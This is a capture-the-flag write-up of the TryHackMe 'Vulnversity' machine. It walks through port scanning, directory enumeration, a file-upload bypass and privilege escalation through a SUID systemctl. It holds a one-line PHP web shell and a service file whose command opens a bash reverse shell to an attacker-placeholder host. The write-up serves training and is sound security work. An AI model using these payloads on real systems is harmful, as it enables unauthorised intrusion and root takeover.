# TryHackMe - Vulnversity

## Machine Information

| Field            | Details                                                                                    |
| ---------------- | ------------------------------------------------------------------------------------------ |
| Platform         | TryHackMe                                                                                  |
| Machine          | Vulnversity                                                                                |
| Difficulty       | Easy                                                                                       |
| Operating System | Linux                                                                                      |
| Category         | Web Exploitation, Enumeration, Privilege Escalation                                        |
| Main Skills      | Port scanning, directory enumeration, file upload exploitation, Linux privilege escalation |

---

# Overview

Vulnversity is a beginner-friendly Linux machine designed to introduce common penetration testing techniques.

The challenge focuses on:

* Network reconnaissance
* Web directory enumeration
* Identifying vulnerable upload functionality
* Exploiting a web application
* Escalating privileges through Linux configuration weaknesses

---

# Reconnaissance

The first step was identifying available services running on the target machine.

## Nmap Scan

```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

The scan revealed multiple open services.

Example:

```text
21/tcp   FTP
22/tcp   SSH
80/tcp   HTTP
3128/tcp Squid Proxy
3333/tcp HTTP
```

The web services were investigated further.

---

# Web Enumeration

The website was accessed through the HTTP service.

Directory enumeration was performed to discover hidden files and directories.

Using Gobuster:

```bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

A hidden directory was discovered:

```text
/internal/
```

The directory contained a file upload functionality.

---

# File Upload Vulnerability

The upload functionality allowed users to upload files.

Testing showed that the application attempted to restrict executable file types.

Common extensions were tested:

```text
.php
.php3
.php5
```

A PHP reverse shell payload was prepared and uploaded using an allowed extension.

Example payload:

```php
<?php
system($_GET['cmd']);
?>
```

The uploaded file was then accessed through the web server.

---

# Initial Access

A reverse shell payload was used to gain command execution on the target.

A listener was started:

```bash
nc -lvnp 4444
```

After triggering the uploaded payload, a reverse shell connection was received.

The shell was upgraded:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

# User Enumeration

After obtaining access, the system was enumerated.

Current user:

```bash
whoami
```

System information:

```bash
uname -a
```

The user flag was located in the user directory.

---

# Privilege Escalation

Privilege escalation enumeration was performed.

SUID binaries were searched:

```bash
find / -perm -u=s -type f 2>/dev/null
```

A vulnerable SUID binary was discovered:

```text
/bin/systemctl
```

The binary could be abused to execute commands with elevated privileges.

---

# Exploiting SUID Permission

A malicious service file was created that executed a reverse shell with root privileges.

Example:

```ini
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'

[Install]
WantedBy=multi-user.target
```

The service was enabled and executed using the vulnerable binary.

A root shell was obtained.

---

# Flags

The machine contained two flags:

## User Flag

Located inside the user's home directory.

```text
/home/<user>/user.txt
```

## Root Flag

Located inside the root directory.

```text
/root/root.txt
```

---

# Tools Used

* Nmap
* Gobuster
* Netcat
* Burp Suite
* Linux enumeration tools

---

# Vulnerabilities Identified

## Unrestricted File Upload

**Type:** Web Application Vulnerability

**Impact:**

Allows attackers to upload executable files and potentially achieve remote code execution.

---

## Weak Privilege Configuration

**Type:** Privilege Escalation

**Impact:**

Misconfigured permissions allowed a low-privileged user to execute commands with elevated privileges.
